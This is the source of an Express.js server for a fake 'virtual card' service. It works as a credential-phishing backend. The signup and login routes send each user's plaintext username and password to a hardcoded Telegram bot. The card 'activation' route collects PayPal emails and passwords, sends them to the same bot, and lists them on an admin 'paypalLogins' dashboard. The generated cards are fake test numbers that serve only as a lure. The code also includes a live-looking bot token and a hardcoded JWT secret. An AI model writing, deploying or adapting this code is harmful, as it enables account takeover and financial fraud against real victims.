const express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for frontend
const cors = require('cors');
app.use(cors({ origin: 'https://o-448v.onrender.com' })); // Updated for deployed frontend
app.use(express.json());

// Data file initialization
const dataFile = 'data.json';
let data = { users: [], cards: [], logs: [] };
try {
    if (fs.existsSync(dataFile)) {
        data = JSON.parse(fs.readFileSync(dataFile));
    } else {
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    }
} catch (error) {
    console.error('Error loading data.json:', error);
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
}

// Telegram credentials
const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
const TELEGRAM_CHAT_ID_ADMIN = '6270110371';

// Middleware to verify token
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token provided' });
    jwt.verify(token, 'your-secret-key', (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
};

// Telegram notification function with forced test
async function sendTelegramNotification(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_ADMIN, text: message })
        });
        if (response.ok) {
            console.log('Telegram notification sent:', message);
            return true;
        } else {
            const errorText = await response.text();
            console.error('Telegram API error:', errorText);
            return false;
        }
    } catch (error) {
        console.error('Telegram notification error:', error.message);
        return false;
    }
}

// Force a test notification on server start
app.listen(port, async () => {
    console.log(`Server running on port ${port}`);
    const testMessage = 'Server started successfully - Test notification from https://o-448v.onrender.com';
    const success = await sendTelegramNotification(testMessage);
    if (!success) {
        console.error('Failed to send test notification. Check bot token, chat ID, and network connectivity.');
    }
});

// Authentication routes
app.post('/api/auth/signup', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
            return res.status(400).json({ error: 'Invalid username or password' });
        }
        if (data.users.find(u => u.username === username)) {
            return res.status(400).json({ error: 'Username already exists' });
        }
        data.users.push({ username, password });
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        const message = `New signup: Username: ${username}, Password: ${password}`;
        await sendTelegramNotification(message);
        res.status(201).json({ message: 'User created successfully' });
    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ error: 'Server error during signup' });
    }
});

app.post('/api/auth/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = data.users.find(u => u.username === username && u.password === password);
        if (!user) return res.status(401).json({ error: 'Invalid credentials' });
        const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
        const message = `Login: Username: ${username}, Password: ${password}`;
        await sendTelegramNotification(message);
        res.json({ token });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Server error during login' });
    }
});

// Card management routes
app.get('/api/cards', authenticateToken, (req, res) => {
    try {
        const userCards = data.cards.filter(c => c.user === req.user.username);
        res.json(userCards);
    } catch (error) {
        console.error('Fetch cards error:', error);
        res.status(500).json({ error: 'Server error fetching cards' });
    }
});

app.post('/api/cards/generate', authenticateToken, (req, res) => {
    try {
        const { name, expDate, amount } = req.body;
        if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
            return res.status(400).json({ error: 'Invalid card details' });
        }
        const cardId = Date.now().toString();
        const card = { cardId, name, expDate, amount, number: '4111-1111-1111-1111', cvv: '123', user: req.user.username, status: 'pending' };
        data.cards.push(card);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.status(201).json({ cardId });
    } catch (error) {
        console.error('Generate card error:', error);
        res.status(500).json({ error: 'Server error generating card' });
    }
});

app.delete('/api/cards/:cardId', authenticateToken, (req, res) => {
    try {
        const cardId = req.params.cardId;
        const cardIndex = data.cards.findIndex(c => c.cardId === cardId && c.user === req.user.username);
        if (cardIndex === -1) return res.status(404).json({ error: 'Card not found' });
        data.cards.splice(cardIndex, 1);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.json({ message: 'Card deleted' });
    } catch (error) {
        console.error('Delete card error:', error);
        res.status(500).json({ error: 'Server error deleting card' });
    }
});

app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
    try {
        const cardId = req.params.cardId;
        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        res.json(card);
    } catch (error) {
        console.error('Activation fetch error:', error);
        res.status(500).json({ error: 'Server error fetching activation details' });
    }
});

app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
    try {
        const cardId = req.params.cardId;
        const { username: paypalUsername, password: paypalPassword } = req.body;
        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        if (!paypalUsername || !paypalPassword) return res.status(400).json({ error: 'PayPal credentials required' });
        card.status = 'activated';
        card.paypalUsername = paypalUsername;
        card.paypalPassword = paypalPassword;
        data.logs.push({ user: req.user.username, time: Date.now() });
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        const message = `Card ${cardId} activated by ${req.user.username} with PayPal: Email: ${paypalUsername}, Password: ${paypalPassword}`;
        const telegramSuccess = await sendTelegramNotification(message);
        res.json({ message: 'Card activated', cardId, telegramNotification: telegramSuccess });
    } catch (error) {
        console.error('Activate card error:', error);
        res.status(500).json({ error: 'Server error activating card' });
    }
});

app.get('/api/cards/logs', authenticateToken, (req, res) => {
    try {
        res.json(data.logs);
    } catch (error) {
        console.error('Fetch logs error:', error);
        res.status(500).json({ error: 'Server error fetching logs' });
    }
});

app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
    try {
        if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied' });
        res.json({ generatedCards: data.cards, paypalLogins: data.cards.filter(c => c.paypalUsername) });
    } catch (error) {
        console.error('Dashboard error:', error);
        res.status(500).json({ error: 'Server error loading dashboard' });
    }
});

// Error handlers
app.use((err, req, res, next) => {
    console.error('Global error:', err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

app.use((req, res) => {
    res.status(404).json({ error: 'Route not found' });
});

process.on('SIGTERM', () => {
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    process.exit(0);
});
